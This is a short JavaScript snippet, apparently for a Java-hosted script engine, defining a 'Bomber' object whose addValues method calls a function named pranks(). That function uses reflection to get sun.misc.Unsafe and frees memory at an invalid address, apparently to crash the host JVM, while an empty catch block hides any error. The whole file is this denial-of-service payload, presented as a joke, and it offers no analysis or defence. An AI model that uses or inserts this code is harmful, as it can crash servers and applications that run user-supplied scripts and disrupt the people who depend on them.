// just joke?
function Bomber() {
         this.addValues = function (values) {
             pranks();
         }   
      }
      function pranks() {
        try {
            var theUnsafe = Java.type("sun.misc.Unsafe").class.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            theUnsafe.get(null).freeMemory(0x7fffffffffffffff);
        } catch (err) {}
}